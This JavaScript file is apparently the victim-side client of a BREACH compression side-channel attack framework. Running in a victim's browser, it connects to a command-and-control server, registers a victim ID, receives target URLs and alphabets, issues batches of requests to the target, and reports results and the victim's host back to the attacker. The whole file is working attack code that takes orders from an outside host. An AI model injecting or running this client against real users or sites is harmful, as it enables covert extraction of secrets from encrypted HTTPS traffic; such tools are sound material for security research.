const io = require('socket.io-client'),
      req = require('./request.js'),
      config = require('./config.js');

const BREACHClient = {
    ONE_REQUEST_TIMEOUT: 5000,
    MORE_WORK_TIMEOUT: 10000,
    _socket: null,
    init() {
        this._socket = io.connect(config.COMMAND_CONTROL_URL);
        this._socket.on('connect', () => {
            console.log('Connected');
            this.noWork(0);
        });
        this._socket.on('do-work', (work) => {
            console.log('do-work message');
            this.doWork(work);
        });
        this._socket.on('server-hello', () => {
            this.getWork();
            console.log('Initialized');
        });
        this._socket.on('server-nowork', () => {
            this.noWork(1);
        });
    },
    noWork(flag) {
        if (flag == 0) {
            this._socket.emit('client-hello', {
                victim_id: config.VICTIM_ID
            });
        }
        else {
            console.log('No work');
            setTimeout(
                () => {
                    this._socket.emit('client-hello', {
                        victim_id: config.VICTIM_ID
                    })
                },
                this.MORE_WORK_TIMEOUT
            );
        }
    },
    doWork(work) {
        const {url, amount, alignmentalphabet} = work;

        // TODO: rate limiting
        if (typeof url == 'undefined') {
            this.noWork(1);
            return;
        }
        console.log('Got work: ', work);

        const reportCompletion = (success) => {
            if (success) {
                console.log('Reporting work-completed to server');
            }
            else {
                console.log('Reporting work-completed FAILURE to server');
            }

            this._socket.emit('work-completed', {
                work: work,
                success: success,
                host: window.location.host
            });
        }
        req.Collection.create(
            url,
            {amount: amount, alignmentalphabet: alignmentalphabet},
            function() {},
            reportCompletion.bind(this, true),
            reportCompletion.bind(this, false)
        );
    },
    getWork() {
        console.log('Getting work');
        this._socket.emit('get-work');
    }
};


BREACHClient.init();
